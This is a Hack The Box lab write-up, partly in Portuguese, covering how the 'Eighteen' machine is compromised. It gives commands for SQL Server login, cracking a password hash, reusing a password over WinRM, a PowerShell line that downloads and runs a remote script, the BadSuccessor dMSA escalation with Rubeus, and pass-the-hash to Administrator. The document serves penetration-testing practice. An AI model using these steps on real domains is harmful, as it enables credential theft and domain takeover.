# HTB Eighteen — Writeup

## Initial Reconnaissance

- **Port Scan**

```bash
nmap -sV -sC
```

- **Port 80**: Microsoft IIS 10.0  
  Página: `Welcome - eighteen.htb`

- **Port 5985**: WinRM Service

- **Port 1433**: Microsoft SQL Server 2022 (descoberto posteriormente)

---

## Initial Access via SQL Server

### Step 1: SQL Authentication

```bash
mssqlclient.py 'eighteen.htb/kevin:iNa2we6haRj2gaw!@10.10.11.95'
```

---

### Step 2: Database Enumeration

```sql
exec_as_login appdev
use financial_planner
select * from users;
```

---

### Step 3: Credential Discovery

Usuário encontrado: `kevin`  
Hash PBKDF2:

```text
pbkdf2:sha256:600000$uwVXXhAhZucxzWI6$3705cfbc05282de557b4ac175d1d58c5c58e5eb7f2a2a2507a0d5a6d1e8bee09
```

- **Password crackeada**: `iloveyou1`

---

### Step 4: WinRM Access

Password reutilizada para o usuário `adam.scott`:

```bash
evil-winrm -i eighteen.htb -u adam.scott -p 'iloveyou1'
```

---

## Privilege Escalation

### Step 1: Tool Preparation

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/main/tools/ActiveDirectory/BadSuccessor.ps1')
```

---

### Step 2: Automatic Exploitation

```powershell
Import-Module .\BadSuccessor.ps1

BadSuccessor -Mode GetThemHashes -Domain eighteen.htb -Path "OU=Staff,DC=eighteen,DC=htb" -DelegatedAdmin adam.scott -DelegateTarget Administrator
```

---

### Step 3: Alternative Manual Method

```powershell
BadSuccessor -Mode exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "attack_dmsa" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -Domain "eighteen.htb"
```

```powershell
.\Rubeus.exe kerberoast /user:attack_dmsa$ /nowrap
.\Rubeus.exe asktgt /user:attack_dmsa$ /domain:eighteen.htb /nowrap
```

---

## Administrator Access

```bash
evil-winrm -i eighteen.htb -u administrator -H <ADMIN_NTLM_HASH>
```

---

## Flag Capture

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Attack Path Summary

1. SQL Server → Credential theft  
2. Password reuse → Initial shell as adam.scott  
3. BadSuccessor exploit → Domain Admin privileges  
4. Administrator shell → Root flag  

---

## Key Vulnerabilities

1. Weak/default SQL credentials  
2. Password reuse across accounts  
3. Windows Server 2025 BadSuccessor vulnerability  
4. Excessive delegation permissions in AD  

---

## Tools Used

- nmap  
- mssqlclient.py (Impacket)  
- evil-winrm  
- BadSuccessor.ps1  
- Rubeus.exe  

**Time**: ~2–3 hours  
**Difficulty**: Medium–High  
**CVE**: Windows Server 2025 BadSuccessor vulnerability
